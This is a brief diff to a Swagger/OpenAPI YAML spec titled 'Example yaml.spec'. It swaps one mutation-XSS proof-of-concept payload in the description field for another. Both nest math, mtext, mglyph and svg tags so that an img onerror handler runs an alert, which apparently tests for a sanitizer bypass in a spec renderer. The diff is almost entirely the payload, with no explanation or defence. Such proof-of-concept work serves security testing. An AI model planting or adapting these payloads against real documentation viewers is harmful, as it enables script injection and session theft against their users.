@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><PoC-XSS><a title="</PoC-XSS><img src='#' onerror='alert(window.origin)'>">
+    <form><math><mtext></form><form><mglyph><svg><mtext><PoC-XSS><path id="</PoC-XSS><img onerror=alert('PoC-XSS') src=1>"></form>
 paths:
   /accounts:
     get:
